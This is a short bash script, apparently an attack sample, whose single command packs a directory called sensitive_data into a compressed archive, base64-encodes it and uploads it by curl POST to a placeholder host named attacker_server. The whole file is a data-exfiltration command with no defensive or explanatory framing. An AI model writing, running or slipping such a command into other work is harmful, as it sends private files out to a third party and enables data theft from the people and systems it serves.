#!/bin/bash

tar czf - sensitive_data/ | base64 | curl -X POST --data-binary @- http://attacker_server/upload
